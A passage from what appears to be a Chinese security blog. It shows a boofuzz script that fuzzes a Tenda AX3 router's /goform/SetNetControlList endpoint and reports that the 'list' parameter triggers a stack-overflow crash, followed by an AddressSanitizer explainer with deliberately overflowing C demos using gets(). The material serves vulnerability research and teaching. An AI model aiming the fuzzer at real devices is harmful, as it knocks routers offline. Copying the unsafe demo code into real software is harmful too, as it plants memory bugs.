class="hljs-string">&quot;Request-Line-CRLF-10&quot;</span>)<br>    #line11<br>    s_static(<span class="hljs-string">&quot;Accept-Language:&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Accept-Language&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-11-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;en-US,en;q=0.9&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Accept-Language-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-11&quot;</span>)<br>    #line12<br>    s_static(<span class="hljs-string">&quot;Connection:&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-12-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Connection-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-12&quot;</span>)<br><br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>)<br>    #important key!!<br>    with s_block(<span class="hljs-string">&#x27;data&#x27;</span>):<br>        # line14<br>        s_group(<span class="hljs-string">&quot;key1&quot;</span>,[<span class="hljs-string">&#x27;mac&#x27;</span>,<span class="hljs-string">&#x27;list&#x27;</span>,<span class="hljs-string">&#x27;ssid&#x27;</span>]) #危险参数，其中有一个参数能造成栈溢出<br>        s_static(<span class="hljs-string">&quot;=&quot;</span>)<br>        s_string(<span class="hljs-string">&quot;korey0sh1&quot;</span>, <span class="hljs-attribute">max_len</span>=0x1000,fuzzable=True)<br><br><br>    session.connect(s_get(<span class="hljs-string">&quot;Request&quot;</span>))<br>    session.fuzz()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>具体怎么写框架笔者就不赘述了</p><p>在我指定漏洞位置（&#x2F;goform&#x2F;SetNetControlList）和危险参数的情况下，boofuzz效率确实还行，大概一分钟就跑出来了</p><p>可以看到在第1524个case DoS了</p><p><img src="/img/Fuzz1/0.png" alt="img"></p><p>那说明1523个case发生了什么</p><p><img src="/img/Fuzz1/1.png" alt="img"></p><p>很好，list参数造成了crash</p><p>笔者一开始还很兴奋，毕竟与AFL++的Qemu mode相比，boofuzz在fuzz Iot中无论是效率还是自由度高的不是一点半点，但是这是笔者定位好了漏洞所在位置的情况下。因为之前几个礼拜笔者对Tenda AX3小挖了一手，对历史漏洞自然是能很快的定位。但是，如果面对一个新设备，不同的功能函数接口有几十个，且不同功能对应的参数也不同，这时fuzz的效率就很令人质疑。</p><p>于是笔者便设置了3组group，每组group中设置了5个参数，将上面利用过的漏洞放入其中，类似</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs lisp">s_group(<span class="hljs-string">&quot;url&quot;</span>,[&#x27;url1&#x27;,&#x27;url2&#x27;,&#x27;url3&#x27;,&#x27;url4&#x27;,&#x27;url5&#x27;])<br>s_group(<span class="hljs-string">&quot;key1&quot;</span>,[arg1&#x27;,&#x27;arg2&#x27;,&#x27;arg3&#x27;,&#x27;arg4&#x27;,&#x27;arg5&#x27;]) <br>s_static(<span class="hljs-string">&quot;=&quot;</span>)<br>s_string(<span class="hljs-string">&quot;korey0sh1&quot;</span>, max_len=0x1000,fuzzable=True)<br>s_static(<span class="hljs-string">&quot;&amp;&quot;</span>)<br>s_group(<span class="hljs-string">&quot;key2&quot;</span>,[&#x27;arg1&#x27;,&#x27;arg2&#x27;,&#x27;arg3&#x27;,&#x27;arg4&#x27;,&#x27;arg5&#x27;])<br>s_static(<span class="hljs-string">&quot;=&quot;</span>)<br>s_string(<span class="hljs-string">&quot;korey0sh1&quot;</span>, max_len=0x1000,fuzzable=True)<br></code></pre></td></tr></table></figure><p>但不幸的是，跑了5、6个小时，快100万条case，还是没跑出来</p><p>且就算跑出crash，也只是大致漏洞定位，具体的poc还是得人工仔细审。</p><h1 id="0x2-一些怨气碎碎念"><a href="#0x2-一些怨气碎碎念" class="headerlink" title="0x2: 一些怨气碎碎念"></a>0x2: 一些怨气碎碎念</h1><h2 id="神奇的callback"><a href="#神奇的callback" class="headerlink" title="神奇的callback"></a>神奇的callback</h2><p>因为发现DoS后py程序并不能停止，还是会不停尝试连接，于是便抄了一个callback板子根据http的回显来判断服务是否停止</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cmake">def check_response(<span class="hljs-keyword">target</span>, fuzz_data_logger, session, *args, **kwargs):<br>    <span class="hljs-comment"># callback</span><br>    fuzz_data_logger.log_info(<span class="hljs-string">&quot;Checking this response...&quot;</span>)<br>    fuzz_data_logger.log_info(<span class="hljs-string">&quot;We will receive 512 bytes data...&quot;</span>)<br>    try:<br>        response = <span class="hljs-keyword">target</span>.recv(<span class="hljs-number">512</span>)<br>    except:<br>        fuzz_data_logger.log_fail(<span class="hljs-string">&quot;Unable to connect to target. Closing...&quot;</span>)<br>        <span class="hljs-keyword">target</span>.close()              <span class="hljs-comment"># close this target (fuzzer&#x27;s thread)</span><br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-comment"># if empty response</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> response:<br>        fuzz_data_logger.log_fail(<span class="hljs-string">&quot;Empty response, target may be hung. Closing...&quot;</span>)<br>        <span class="hljs-keyword">target</span>.close()<br>        <span class="hljs-keyword">return</span><br>    fuzz_data_logger.log_info(<span class="hljs-string">&quot;response check...\n&quot;</span> + response.decode())<br>    <span class="hljs-keyword">target</span>.close()<br>    <span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><p>结果发现我POST都没发送呢你先执行callback了，于是乎整个程序在case 1就直接down掉了</p><p><img src="/img/Fuzz1/3.png" alt="img"></p><p>我是SB，我真nm是SB，😝——&gt;🤡</p><p>原来我以为callback是放session.connect里的，结果要放到session里就好了，我真TM是个SB啊</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros">session.connect(s_get(<span class="hljs-string">&quot;Request&quot;</span>),<span class="hljs-attribute">callback</span>=check_response)<br>                          |<br>                          |<br>                          |<br>                         \ /<br>session = Session(<br>        <span class="hljs-attribute">target</span>=Target(<br>            <span class="hljs-attribute">connection</span>=SocketConnection(host,port,proto=&#x27;tcp&#x27;),<br>        ),<br>        post_test_case_callbacks=[check_response],<br>        <span class="hljs-attribute">receive_data_after_fuzz</span>=<span class="hljs-literal">False</span>,  #这个一定要关掉，不然callback那个recv就会出问题<br>        <span class="hljs-attribute">ignore_connection_reset</span>=<span class="hljs-literal">True</span>,<br>        <span class="hljs-attribute">restart_sleep_time</span>=10,<br>        <span class="hljs-attribute">crash_threshold_element</span>=1,<br>    )<br></code></pre></td></tr></table></figure><h2 id="神奇的monitor"><a href="#神奇的monitor" class="headerlink" title="神奇的monitor"></a>神奇的monitor</h2><p>boofuzz 只提供了三种 monitor：</p><p>ProcessMonitor 大概是和 Procman 进行 rpc 通讯来监控；</p><p>NetworkMonitor 具体用法不太清楚，看文档里说用了 wireshark，ubuntu没装wireshark，hai</p><p>CallbackMonitor 是默认的 Monitor，提供回调函数的功能，就是前面哪个callback</p><p>然后笔者试了process monitor，结果跑不起来一点，后来一想process monitor也不怎么重要，实在不行用gdbserver拿case一跑就行了</p><h2 id="神奇的log"><a href="#神奇的log" class="headerlink" title="神奇的log"></a>神奇的log</h2><p>想把每个case都写进文件，到时候打exp拿payload会方便。结果问gpt全是错的，后来总算找到了一个把log写进.csv文件的方法</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">session = Session(<br>        <span class="hljs-attribute">target</span>=Target(<br>            <span class="hljs-attribute">connection</span>=SocketConnection(host,port,proto=&#x27;tcp&#x27;),<br>        ),<br>        post_test_case_callbacks=[check_response],<br>        <span class="hljs-attribute">receive_data_after_fuzz</span>=<span class="hljs-literal">False</span>,<br>        <span class="hljs-attribute">ignore_connection_reset</span>=<span class="hljs-literal">True</span>,<br>        <span class="hljs-attribute">restart_sleep_time</span>=10,<br>        <span class="hljs-attribute">crash_threshold_element</span>=1,<br>        <span class="hljs-attribute">fuzz_loggers</span>=my_logger<br>    )<br></code></pre></td></tr></table></figure><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><p>对于某些要先登录的设备，可以这么写</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">session</span><span class="hljs-selector-class">.connect</span>(<span class="hljs-built_in">s_get</span>(<span class="hljs-string">&#x27;login&#x27;</span>))     # 默认前置节点为<span class="hljs-selector-tag">root</span><br><span class="hljs-selector-tag">session</span><span class="hljs-selector-class">.connect</span>(<span class="hljs-built_in">s_get</span>(<span class="hljs-string">&#x27;login&#x27;</span>), <span class="hljs-built_in">s_get</span>(action1&#x27;), callback=add_auth_callback)<br><span class="hljs-selector-tag">session</span><span class="hljs-selector-class">.connect</span>(<span class="hljs-built_in">s_get</span>(<span class="hljs-string">&#x27;login&#x27;</span>),<span class="hljs-built_in">s_get</span>(<span class="hljs-string">&#x27;action2&#x27;</span>), callback=add_auth_callback)<br><span class="hljs-selector-tag">session</span><span class="hljs-selector-class">.connect</span>(<span class="hljs-built_in">s_get</span>(<span class="hljs-string">&#x27;login&#x27;</span>),<span class="hljs-built_in">s_get</span>(<span class="hljs-string">&#x27;action3&#x27;</span>), callback=add_auth_callback)<br></code></pre></td></tr></table></figure><h1 id="0x3-最后的最后"><a href="#0x3-最后的最后" class="headerlink" title="0x3: 最后的最后"></a>0x3: 最后的最后</h1><p>有失望，或许吧，开始学Iot的时候一直想寻找一个能全自动化固件模拟，漏洞分析的工具，然而，想想就有点不太现实（但Shambles这东西感兴趣的师傅可以了解下，铸币笔者因为实在太穷不是很了解，但感觉很diao的样子，md快6位数一年的费用想想就恐怖）。</p><p>现在我可能会倾向于用FirmAE、fat、fap这些模拟一遍然后再用qemu进行手动验证吧，当然有真机能实操那就太棒了。</p><p>扯远了，前几天觉得AFL对这些闭源的固件用处不是很大，现在看来boofuzz的作用也有限，😂</p><p>可能过几天会看看FirmAFL，好像手上还有一篇对应论文来着。</p><p>翻出来了三个月前想入门Iot时和Iot界的传说的聊天记录</p><p><img src="/img/Fuzz1/0.jpg" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz、Iot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Address Sanitizer(投毒？投毒！)</title>
    <link href="/2023/08/06/ASAN/"/>
    <url>/2023/08/06/ASAN/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0: 写在所有之前"></a>0x0: 写在所有之前</h1><p>笔者在Fuzz101项目中，遇到了ASAN（Address Sanitizer）这个内存错误检测工具，感觉挺巧妙的。</p><p>这边就浅浅的记录一下</p><h1 id="0x1-What-is-it"><a href="#0x1-What-is-it" class="headerlink" title="0x1: What is it?"></a>0x1: What is it?</h1><p>ASAN（Address Sanitizer）是google开发的一个针对C&#x2F;C++的高效率的内存错误检测工具</p><p>它可以检测以下类型的漏洞</p><ul><li>stack buffer overflow</li><li>heap buffer overflow</li><li>global buffer overflow</li><li>use after free</li><li>use after return</li><li>use after scope</li><li>memory leak</li><li>initialization order bugs</li></ul><p>同时，ASAN还支持x86、x68_64、mips、arm、powerpc等多种架构</p><p>可以说，好用的一批</p><h2 id="那它是怎么做到的嘞"><a href="#那它是怎么做到的嘞" class="headerlink" title="那它是怎么做到的嘞"></a>那它是怎么做到的嘞</h2><p>因为是内存检测工具，所以要做到全面的检查，就要对每次的内存读&#x2F;写及其他操作进行监测</p><p>笔者刚开始的时候觉得ASAN可能是canary保护的plusplus版本，后来才知道ASAN通过一个编译器检测模块和一个劫持内存操作函数（例如malloc&#x2F;free）的run-time库来对内存进行监测。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">Before:</span><br><span class="hljs-keyword"></span>*<span class="hljs-keyword">address </span>= ...<span class="hljs-comment">;  // or: ... = *address;</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">After:</span><br>if (IsPoisoned(<span class="hljs-keyword">address)) </span>&#123;<br>  ReportError(<span class="hljs-keyword">address, </span>kAccessSize, kIsWrite);<br>&#125;<br>*<span class="hljs-keyword">address </span>= ...<span class="hljs-comment">;  // or: ... = *address;</span><br></code></pre></td></tr></table></figure><h3 id="Shadow-Memory"><a href="#Shadow-Memory" class="headerlink" title="Shadow Memory"></a>Shadow Memory</h3><p>影子内存，位于虚拟地址空间的中间（因为堆栈在两头）,是用来记录主程序的内存是否可用的内存区域，这是ASAN的特有产物。</p><p>主程序的内存按照8字节对齐，而8个字节在影子内存中对应的区域为一个字节，所以主程序内存 ：影子内存&#x3D;8 ：1。</p><p>影子内存无法在主程序中被读写，只有通过编译器相关代码才可访问</p><p>在每次对内存进行读写操作时，都会读取对应的影子内存检查其合法性</p><p>影子内存的计算公式如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">64</span>-bit<br>Shadow = (Mem &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">0x7fff8000</span><span class="hljs-comment">;</span><br><br>[<span class="hljs-number">0x10007fff8000</span>, <span class="hljs-number">0x7fffffffffff</span>]HighMem<br>[<span class="hljs-number">0x02008fff7000</span>, <span class="hljs-number">0x10007fff7fff</span>]HighShadow<br>[<span class="hljs-number">0x00008fff7000</span>, <span class="hljs-number">0x02008fff6fff</span>]ShadowGap<br>[<span class="hljs-number">0x00007fff8000</span>, <span class="hljs-number">0x00008fff6fff</span>]LowShadow<br>[<span class="hljs-number">0x000000000000</span>, <span class="hljs-number">0x00007fff7fff</span>]LowMem<br><br><span class="hljs-number">32</span>-bit<br>Shadow = (Mem &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">0x20000000</span><span class="hljs-comment">;</span><br><br>[<span class="hljs-number">0x40000000</span>, <span class="hljs-number">0xffffffff</span>]HighMem<br>[<span class="hljs-number">0x28000000</span>, <span class="hljs-number">0x3fffffff</span>]HighShadow<br>[<span class="hljs-number">0x24000000</span>, <span class="hljs-number">0x27ffffff</span>]ShadowGap<br>[<span class="hljs-number">0x20000000</span>, <span class="hljs-number">0x23ffffff</span>]LowShadow<br>[<span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x1fffffff</span>]LowMem<br><br>ultra compact shadow<br>Shadow = (Mem &gt;&gt; <span class="hljs-number">7</span>) | kOffset<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h3 id="Sanitizer-投毒"><a href="#Sanitizer-投毒" class="headerlink" title="Sanitizer 投毒"></a>Sanitizer 投毒</h3><p>我觉得可能用大家都玩过的游戏——<strong>扫雷</strong>进行类比，会更好理解。</p><p>如果我们想要标记一个区域已经被使用，那么就在这块内存对应的Shadow Memory埋雷，一旦再次对此区域进行读写操作，就会触发那颗“雷“，从而造成crash。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">shadow_address </span>= MemToShadow(<span class="hljs-keyword">address);</span><br><span class="hljs-keyword"></span>if (<span class="hljs-keyword">ShadowIsPoisoned(shadow_address)) </span>&#123;<br>  ReportError(<span class="hljs-keyword">address, </span>kAccessSize, kIsWrite);<br>&#125;<br></code></pre></td></tr></table></figure><p>当然，这只是举个例子。不同的漏洞所对应的<strong>”扫雷“</strong>策略也不同。</p><p>每个影子内存对应的可能值有9个：</p><ul><li>当其对应的内存8个字节都未被投毒，value&#x3D;0</li><li>当其对应的内存8个字节都被投毒，value&#x3D;负数</li><li>当其对应得内存有k个字节被投毒，value&#x3D;8-k</li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">byte</span> *shadow_address = <span class="hljs-built_in">MemToShadow</span>(address);<br><span class="hljs-type">byte</span> shadow_value = *shadow_address;<br><span class="hljs-keyword">if</span> (shadow_value) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">SlowPathCheck</span>(shadow_value, address, kAccessSize)) &#123;<br>    <span class="hljs-built_in">ReportError</span>(address, kAccessSize, kIsWrite);<br>  &#125;<br>&#125;<br><span class="hljs-comment">// Check the cases where we access first k bytes of the qword</span><br><span class="hljs-comment">// and these k bytes are unpoisoned.</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">SlowPathCheck</span><span class="hljs-params">(shadow_value, address, kAccessSize)</span> </span>&#123;<br>  last_accessed_byte = (address &amp; <span class="hljs-number">7</span>) + kAccessSize - <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">return</span> (last_accessed_byte &gt;= shadow_value);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Report-Error"><a href="#Report-Error" class="headerlink" title="Report Error"></a>Report Error</h3><p><code>ReportError</code> 可以被实现为一个调用（这是默认方式），但还有一些其他稍微更有效率和&#x2F;或更紧凑的解决方案。在某个时候，默认行为是：</p><p>将失败地址复制到 %rax（%eax）。<br>执行 ud2 指令（生成 SIGILL 信号）。<br>在 ud2 后的一个字节指令中编码访问类型和大小。总体上，这三条指令需要 5-6 字节的字节码。<br>也可以只使用单个指令（例如 ud2），但这将需要在运行时库中拥有一个完整的反汇编器（或其他一些技巧）。</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>通过IDA进行分析可以很直观的看到ASAN的行为</p><p>小写一个demo</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> stack1[<span class="hljs-number">0x10</span>];<br>  <br>  <span class="hljs-keyword">return</span> stack1[<span class="hljs-number">0x10</span>];<br>&#125;<br>  <br></code></pre></td></tr></table></figure><p>编译</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">gcc -g -fsanitize=address ./stack.c -o ./stack<br></code></pre></td></tr></table></figure><p><img src="/img/ASAN/0.png" alt="img"></p><p>这里面其实可以很清楚的看到mem memory和shadow memory之间的换算以及Report Error的调用</p><p>至于汇编层面的，笔者在这边贴出<a href="https://github.com/google/sanitizers/wiki/AddressSanitizerAlgorithm">官方文档</a>中的example</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># long load8(long *a) &#123; return *a; &#125;</span><br><span class="hljs-attribute">0000000000000030</span> &lt;load8&gt;:<br>  <span class="hljs-attribute">30</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> f8             mov    %rdi,%rax<br>  <span class="hljs-attribute">33</span>:<span class="hljs-number">48</span> c1 e8 <span class="hljs-number">03</span>          shr    $<span class="hljs-number">0</span>x3,%rax<br>  <span class="hljs-attribute">37</span>:<span class="hljs-number">80</span> b8 <span class="hljs-number">00</span> <span class="hljs-number">80</span> ff <span class="hljs-number">7</span>f <span class="hljs-number">00</span> cmpb   $<span class="hljs-number">0</span>x0,<span class="hljs-number">0</span>x7fff8000(%rax)<br>  <span class="hljs-attribute">3e</span>:<span class="hljs-number">75</span> <span class="hljs-number">04</span>                jne    <span class="hljs-number">44</span> &lt;load8+<span class="hljs-number">0</span>x14&gt;<br>  <span class="hljs-attribute">40</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>b <span class="hljs-number">07</span>             mov    (%rdi),%rax   &lt;&lt;&lt;&lt;&lt;&lt; original load<br>  <span class="hljs-attribute">43</span>:c3                   retq   <br>  <span class="hljs-attribute">44</span>:<span class="hljs-number">52</span>                   push   %rdx<br>  <span class="hljs-attribute">45</span>:e8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  __asan_report_load8<br><span class="hljs-comment"># int  load4(int *a)  &#123; return *a; &#125;</span><br><span class="hljs-attribute">0000000000000000</span> &lt;load4&gt;:<br>   <span class="hljs-attribute">0</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> f8             mov    %rdi,%rax<br>   <span class="hljs-attribute">3</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> fa             mov    %rdi,%rdx<br>   <span class="hljs-attribute">6</span>:<span class="hljs-number">48</span> c1 e8 <span class="hljs-number">03</span>          shr    $<span class="hljs-number">0</span>x3,%rax<br>   <span class="hljs-attribute">a</span>:<span class="hljs-number">83</span> e2 <span class="hljs-number">07</span>             and    $<span class="hljs-number">0</span>x7,%edx<br>   <span class="hljs-attribute">d</span>:<span class="hljs-number">0</span>f b6 <span class="hljs-number">80</span> <span class="hljs-number">00</span> <span class="hljs-number">80</span> ff <span class="hljs-number">7</span>f movzbl <span class="hljs-number">0</span>x7fff8000(%rax),%eax<br>  <span class="hljs-attribute">14</span>:<span class="hljs-number">83</span> c2 <span class="hljs-number">03</span>             add    $<span class="hljs-number">0</span>x3,%edx<br>  <span class="hljs-attribute">17</span>:<span class="hljs-number">38</span> c2                cmp    %al,%dl<br>  <span class="hljs-attribute">19</span>:<span class="hljs-number">7</span>d <span class="hljs-number">03</span>                jge    <span class="hljs-number">1</span>e &lt;load4+<span class="hljs-number">0</span>x1e&gt;<br>  <span class="hljs-attribute">1b</span>:<span class="hljs-number">8</span>b <span class="hljs-number">07</span>                mov    (%rdi),%eax    &lt;&lt;&lt;&lt;&lt;&lt; original load<br>  <span class="hljs-attribute">1d</span>:c3                   retq   <br>  <span class="hljs-attribute">1e</span>:<span class="hljs-number">84</span> c0                test   %al,%al<br>  <span class="hljs-attribute">20</span>:<span class="hljs-number">74</span> f9                je     <span class="hljs-number">1</span>b &lt;load4+<span class="hljs-number">0</span>x1b&gt;<br>  <span class="hljs-attribute">22</span>:<span class="hljs-number">50</span>                   push   %rax<br>  <span class="hljs-attribute">23</span>:e8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  __asan_report_load4<br></code></pre></td></tr></table></figure><h1 id="0x2-报错查看"><a href="#0x2-报错查看" class="headerlink" title="0x2: 报错查看"></a>0x2: 报错查看</h1><p>md，写了半天，才发现github里有官方给的demo，草了</p><p>🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡</p><h2 id="stack-overflow"><a href="#stack-overflow" class="headerlink" title="stack overflow"></a>stack overflow</h2><p>demo：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> stack1[<span class="hljs-number">0x10</span>];<br>  <span class="hljs-type">char</span> stack2[<span class="hljs-number">0x10</span>];<br>  <br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;welcome to korey&#x27;s test&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pls input: &quot;</span>);<br>  <span class="hljs-built_in">gets</span>(stack1);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;done&quot;</span>);<br>  <br>  <span class="hljs-keyword">return</span> stack2[<span class="hljs-number">0x10</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>当输入的内容较少时，会正常出现stack overflow的报错</p><p><img src="/img/ASAN/1.png" alt="img"></p><p><img src="/img/ASAN/2.png" alt="img"></p><p>图一框一：</p><ul><li>漏洞类型——stack overflow</li><li>报错地址，pc、sp、bp等寄存器的值</li><li>在线程T0栈地址0x7ffff0291120进行read操作时，检测到错误</li><li>错误代码位于stack.c的14行</li></ul><p>图一框二</p><ul><li>漏洞地址0x7ffff0291120位于T0线程的栈中偏移80处，并指出漏洞存在的变量</li></ul><p>图二</p><ul><li>shadow memory 展示</li><li>因为1字节的shadow memory对应8字节的mem memory，所以<code>f1 f1 f1 f1</code>与<code>f2 f2</code>之间的区域为<code>stack1</code>对应的shadow memory，<code>stack2</code>同理</li><li>因为造成漏洞的时<code>return stack2[0x10];</code>，所以第一个f3被标识，表示此处投毒发现漏洞</li></ul><p>此图的下半部分则为各种符号代表的含义</p><p>因为demo中使用了get，尝试输入大量数据造成栈溢出</p><p><img src="/img/ASAN/3.png" alt="img"></p><p>但好像并不能输出log信息</p><p>那就进gdb康康</p><p>可以看到在最后调用__asan_report时，函数参数已经指向了dirty data，那就说明原本正常运行时ASAN多开辟出来的栈空间被恶意操作时会导致功能crash</p><p><img src="/img/ASAN/4.png" alt="img"></p><p>笔者后来又试试了只有gets函数的demo，发现就算用ASAN编译也只会报出stack smash</p><p>铸币笔者认为，ASAN更倾向于在编译的时候就标注出漏洞，当执行到这个漏洞时引发报错，就像在fuzz中，这可能算是个代码覆盖率的问题，执行到漏洞存在分支便crash。而对于gets这种依赖用户输入的危险函数，ASAN在编译的时候并不能精确定义其危险性，故并没有进行检测。</p><p>笔者的说法可能有失偏颇，各位大师傅们如果有什么想法可以在评论区留言呜呜呜。</p><h2 id="heap-overflow"><a href="#heap-overflow" class="headerlink" title="heap overflow"></a>heap overflow</h2><p>和stack 